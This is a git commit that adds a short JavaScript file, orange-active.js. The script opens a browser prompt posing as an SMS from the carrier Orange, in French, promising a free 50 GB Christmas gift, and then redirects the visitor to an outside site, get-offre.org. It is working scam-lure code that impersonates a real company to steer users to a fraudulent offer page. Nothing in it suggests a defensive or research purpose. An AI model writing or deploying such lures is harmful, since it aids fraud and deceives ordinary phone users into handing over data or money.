d2f79e4bc1a061a34d45c3ca1457d514fd0c3ad9
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-18 23:55:22 -0800

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,7 @@
+
+
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes admissible au cadeau Orange 50 Go, Veuillez appuyer sur OK pour activer maintenant   ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://get-offre.org/orange-christmas.html';
+}
